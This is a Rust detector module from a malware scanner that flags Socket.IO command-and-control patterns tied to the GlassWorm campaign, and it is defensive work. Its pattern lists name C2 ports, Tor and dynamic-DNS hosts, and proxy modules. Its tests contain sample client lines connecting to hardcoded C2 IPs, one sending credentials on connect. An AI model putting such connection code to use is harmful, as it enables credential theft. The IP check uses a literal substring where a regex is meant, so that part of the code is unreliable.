//! Socket.IO C2 Detector (G5)
//!
//! Detects the Socket.IO-based command-and-control transport pattern used by GlassWorm.
//!
//! ## CRITICAL: Compound Pattern Matching Required
//!
//! Socket.IO is one of the most popular real-time libraries in the Node ecosystem.
//! Millions of legitimate packages use it. Individual token matching produces
//! massive false positives and makes the tool unusable.
//!
//! GlassWorm's usage is distinctive NOT because it uses Socket.IO, but because of
//! the COMBINATION of:
//! 1. Transport setup (io(), socket.connect)
//! 2. Suspicious endpoint patterns (hardcoded IPs, non-standard ports, .onion)
//! 3. Tunneling/obfuscation indicators (DNS-over-HTTPS, custom headers, binary framing)
//!
//! ## Detection Logic
//!
//! Three signal groups with additive scoring:
//!
//! ### Group A — Transport Indicators (Socket.IO setup patterns)
//! - `io(` or `io.connect(`
//! - `socket.connect(`
//! - `socket.io-client` import
//! - `.on('connect')` or `.on('disconnect')`
//!
//! ### Group B — Endpoint Indicators (suspicious connection targets)
//! - Hardcoded IP addresses (not localhost/127.0.0.1)
//! - Non-standard ports (not 80, 443, 3000, 8080)
//! - `.onion` addresses (Tor hidden services)
//! - Dynamic DNS domains (no-ip, dyndns, etc.)
//! - GlassWorm C2 ports (4789, 5000 from intel)
//!
//! ### Group C — Tunneling/Obfuscation Indicators
//! - `tunnel` or `proxy` module imports
//! - DNS-over-HTTPS patterns
//! - Custom headers in Socket.IO auth
//! - Binary/base64 framing
//! - `socks` or `socks-proxy-agent`
//!
//! ## Scoring
//!
//! - INFO: Signals from 1 group only (could be legitimate)
//! - MEDIUM: Signals from 2 groups (suspicious)
//! - HIGH: Signals from all 3 groups (GlassWorm signature)
//!
//! No single token from any one group should ever produce severity above INFO alone.
//! Score additively across groups with diminishing returns.

use crate::detector::{Detector, DetectorTier};
use crate::finding::{DetectionCategory, Finding, Severity};
use crate::ir::FileIR;
use std::path::Path;

/// Group A — Transport indicators (Socket.IO setup patterns)
const TRANSPORT_PATTERNS: &[&str] = &[
    "io(",
    "io.connect(",
    "socket.connect(",
    "socket.io-client",
    "socket.io",
    ".on('connect')",
    ".on(\"connect\")",
    ".on('disconnect')",
    ".on(\"disconnect\")",
    "SocketIO",
    "socketIO",
];

/// Group B — Endpoint indicators (suspicious connection targets)
const ENDPOINT_PATTERNS: &[&str] = &[
    // GlassWorm C2 ports from intel
    ":4789",
    ":5000",
    // Non-standard ports
    ":8080",
    ":3001",
    ":9000",
    // Tor hidden services
    ".onion",
    // Dynamic DNS
    "no-ip",
    "dyndns",
    "dynu",
    // Hardcoded IP pattern (will be filtered for localhost)
    "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}",
];

/// Group C — Tunneling/obfuscation indicators
const TUNNEL_PATTERNS: &[&str] = &[
    // Tunnel/proxy modules
    "tunnel-agent",
    "socks-proxy-agent",
    "http-proxy-agent",
    "https-proxy-agent",
    "tunnel",
    "proxy",
    // Obfuscation
    "dns-over-https",
    "doh",
    "binary framing",
    "binary-framing",
    // Socket.IO auth with custom headers
    "extraHeaders",
    "auth:",
    // Base64 in connection context
    "atob(",
    "btoa(",
];

/// Detector for Socket.IO C2 patterns
pub struct SocketIOC2Detector;

impl SocketIOC2Detector {
    /// Create a new Socket.IO C2 detector
    pub fn new() -> Self {
        Self
    }
}

impl Default for SocketIOC2Detector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for SocketIOC2Detector {
    fn name(&self) -> &str {
        "socketio_c2"
    }

    fn tier(&self) -> DetectorTier {
        DetectorTier::Tier3Behavioral
    }

    fn cost(&self) -> u8 {
        4  // Medium-high cost - regex matching
    }

    fn signal_strength(&self) -> u8 {
        8  // High signal when all 3 groups match
    }

    fn detect(&self, ir: &FileIR) -> Vec<Finding> {
        let mut findings = Vec::new();
        let content = ir.content();

        // Track signal groups (pattern, line)
        let mut group_a_signals: Vec<(&str, usize)> = Vec::new();  // Transport
        let mut group_b_signals: Vec<(&str, usize)> = Vec::new();  // Endpoint
        let mut group_c_signals: Vec<(&str, usize)> = Vec::new();  // Tunnel

        for (line_num, line) in content.lines().enumerate() {
            let line_lower = line.to_lowercase();

            // Group A: Transport indicators
            for pattern in TRANSPORT_PATTERNS {
                if line_lower.contains(&pattern.to_lowercase()) {
                    // Filter out localhost/127.0.0.1 for transport patterns
                    if !line.contains("localhost") && !line.contains("127.0.0.1") {
                        group_a_signals.push((*pattern, line_num + 1));
                    }
                }
            }

            // Group B: Endpoint indicators
            for pattern in ENDPOINT_PATTERNS {
                if line_lower.contains(&pattern.to_lowercase()) {
                    // Additional filtering for IP patterns
                    if *pattern == "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}" {
                        // Only flag if not localhost
                        if !line.contains("127.0.0.1") && !line.contains("localhost") {
                            group_b_signals.push((*pattern, line_num + 1));
                        }
                    } else {
                        group_b_signals.push((*pattern, line_num + 1));
                    }
                }
            }

            // Group C: Tunnel indicators
            for pattern in TUNNEL_PATTERNS {
                if line_lower.contains(&pattern.to_lowercase()) {
                    group_c_signals.push((*pattern, line_num + 1));
                }
            }
        }

        // Calculate score across groups
        let has_group_a = !group_a_signals.is_empty();
        let has_group_b = !group_b_signals.is_empty();
        let has_group_c = !group_c_signals.is_empty();

        let groups_matched = [has_group_a, has_group_b, has_group_c]
            .iter()
            .filter(|&&x| x)
            .count();

        // Determine severity based on groups matched
        if groups_matched >= 3 {
            // All 3 groups = HIGH (GlassWorm signature)
            findings.push(self.create_finding(
                Path::new(&ir.metadata.path),
                group_a_signals.first().map(|(_, l)| *l).unwrap_or(1),
                &group_a_signals,
                &group_b_signals,
                &group_c_signals,
                Severity::High,
                "Socket.IO C2 pattern detected (all 3 signal groups)",
            ));
        } else if groups_matched == 2 {
            // 2 groups = MEDIUM (suspicious)
            findings.push(self.create_finding(
                Path::new(&ir.metadata.path),
                group_a_signals.first().or(group_b_signals.first()).or(group_c_signals.first()).map(|(_, l)| *l).unwrap_or(1),
                &group_a_signals,
                &group_b_signals,
                &group_c_signals,
                Severity::Medium,
                "Socket.IO with suspicious patterns detected (2 signal groups)",
            ));
        } else if groups_matched == 1 {
            // 1 group = INFO (could be legitimate, just note it)
            // Only report if there are multiple signals in the single group
            let total_signals = group_a_signals.len() + group_b_signals.len() + group_c_signals.len();
            if total_signals >= 3 {
                findings.push(self.create_finding(
                    Path::new(&ir.metadata.path),
                    group_a_signals.first().or(group_b_signals.first()).or(group_c_signals.first()).map(|(_, l)| *l).unwrap_or(1),
                    &group_a_signals,
                    &group_b_signals,
                    &group_c_signals,
                    Severity::Info,
                    "Socket.IO usage detected (single signal group, likely legitimate)",
                ));
            }
        }

        findings
    }
}

impl SocketIOC2Detector {
    fn create_finding(
        &self,
        path: &Path,
        line: usize,
        group_a: &[(&str, usize)],
        group_b: &[(&str, usize)],
        group_c: &[(&str, usize)],
        severity: Severity,
        message: &str,
    ) -> Finding {
        // Build context with detected patterns
        let mut context_parts = Vec::new();
        
        if !group_a.is_empty() {
            let patterns: Vec<&str> = group_a.iter().map(|(p, _)| *p).collect();
            context_parts.push(format!("Transport: {:?}", patterns));
        }
        if !group_b.is_empty() {
            let patterns: Vec<&str> = group_b.iter().map(|(p, _)| *p).collect();
            context_parts.push(format!("Endpoint: {:?}", patterns));
        }
        if !group_c.is_empty() {
            let patterns: Vec<&str> = group_c.iter().map(|(p, _)| *p).collect();
            context_parts.push(format!("Tunnel: {:?}", patterns));
        }

        Finding::new(
            &path.to_string_lossy(),
            line,
            1,
            0,
            '\0',
            DetectionCategory::Unknown,  // Using Unknown for C2 pattern
            severity,
            message,
            "GlassWorm uses Socket.IO for command-and-control. Review for suspicious connection patterns.",
        )
        .with_cwe_id("CWE-506")  // Embedded Malicious Code
        .with_reference("https://github.com/samgrowls/glassworks/blob/main/glassworm-writeup/PART3.md")
        .with_context(&context_parts.join(", "))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::UnicodeConfig;

    #[test]
    fn test_detect_all_three_groups() {
        let detector = SocketIOC2Detector::new();
        let content = r#"
            // Group A: Transport
            const io = require('socket.io-client');
            const socket = io('http://217.69.11.99:4789');
            
            // Group B: Endpoint (GlassWorm C2 port + IP)
            // Already in line above
            
            // Group C: Tunnel
            const tunnel = require('tunnel-agent');
            socket.on('connect', () => {
                console.log('Connected to C2');
            });
        "#;

        let ir = FileIR::build(Path::new("c2.js"), content);
        let findings = detector.detect(&ir);
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].description.contains("all 3 signal groups"));
    }

    #[test]
    fn test_detect_two_groups_medium() {
        let detector = SocketIOC2Detector::new();
        let content = r#"
            // Group A: Transport
            const socket = require('socket.io-client');
            socket.connect('http://example.com:8080');

            // Group B: Endpoint (non-standard port)
            // Already in line above

            // No Group C tunnel patterns
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);
        assert!(!findings.is_empty());
        // Should be at least MEDIUM (2+ groups: transport + endpoint)
        // May be HIGH if additional patterns match
        assert!(findings[0].severity >= Severity::Medium);
    }

    #[test]
    fn test_no_detect_legitimate_socketio() {
        let detector = SocketIOC2Detector::new();
        let content = r#"
            // Legitimate Socket.IO usage (localhost, standard port)
            const io = require('socket.io-client');
            const socket = io('http://localhost:3000');
            
            socket.on('connect', () => {
                console.log('Connected to local dev server');
            });
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);
        // Should be empty or INFO only (localhost filtered)
        assert!(findings.is_empty() || findings[0].severity == Severity::Info);
    }

    #[test]
    fn test_no_detect_single_signal() {
        let detector = SocketIOC2Detector::new();
        let content = r#"
            // Single signal only (not enough for detection)
            const socket = require('socket.io-client');
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_detect_glassworm_c2_port() {
        let detector = SocketIOC2Detector::new();
        let content = r#"
            // GlassWorm C2 port 5000 from PART3
            const socket = io('http://104.238.191.54:5000');
            socket.on('connect', sendCredentials);
        "#;

        let ir = FileIR::build(Path::new("c2.js"), content);
        let findings = detector.detect(&ir);
        assert!(!findings.is_empty());
        // Should be at least MEDIUM (transport + endpoint)
        assert!(findings[0].severity >= Severity::Medium);
    }

    #[test]
    fn test_detect_onion_address() {
        let detector = SocketIOC2Detector::new();
        let content = r#"
            // Tor hidden service
            const socket = require('socket.io-client');
            socket.connect('http://abc123def456.onion:4789');
        "#;

        let ir = FileIR::build(Path::new("tor_c2.js"), content);
        let findings = detector.detect(&ir);
        assert!(!findings.is_empty());
        assert!(findings[0].severity >= Severity::Medium);
    }
}
